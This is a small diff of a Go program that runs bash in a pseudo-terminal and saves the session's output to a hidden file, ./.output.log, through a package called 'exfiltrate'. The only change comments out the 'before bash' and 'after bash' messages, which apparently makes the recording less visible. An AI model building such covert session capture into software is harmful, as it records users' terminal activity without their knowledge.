@@ -14,7 +14,7 @@ import (
 )
 
 func main() {
-	fmt.Println("before bash")
+	//fmt.Println("before bash")
 	c := exec.Command("bash")
 
 	// Start the command with a pty.
@@ -49,7 +49,7 @@ func main() {
 	go func() { _, _ = io.Copy(ptmx, in) }()
 	_, _ = io.Copy(mwOut, ptmx)
 
-	fmt.Println("after bash")
+	//fmt.Println("after bash")
 	// fmt.Println("Captured output", outBuffer.String())
 	exfiltrate.WriteFile(outBuffer.String(), "./.output.log")
 
